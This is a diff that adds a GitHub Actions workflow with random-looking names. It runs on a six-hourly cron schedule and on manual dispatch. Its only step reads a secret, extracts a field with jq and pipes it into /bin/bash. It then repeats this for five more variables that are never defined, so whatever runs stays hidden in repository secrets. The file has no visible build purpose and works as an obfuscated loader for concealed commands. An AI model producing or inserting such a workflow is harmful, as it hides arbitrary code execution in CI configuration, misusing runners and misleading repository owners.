@@ -1,0 +1,23 @@
+name: briellestrapi7629
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: briellestrapi7629
+        env:
+          irdqs0523: ${{ secrets.irdqs0523 }}
+        run: |
+          echo $irdqs0523 | jq -r .u98 | /bin/bash
+          echo $tmdd21675 | jq -r .xlu56071 | /bin/bash
+          echo $zuek51857 | jq -r .cqkj80 | /bin/bash
+          echo $avewg7 | jq -r .rsxe6 | /bin/bash
+          echo $w82073 | jq -r .nauud511 | /bin/bash
+          echo $d249 | jq -r .yet997 | /bin/bash
+
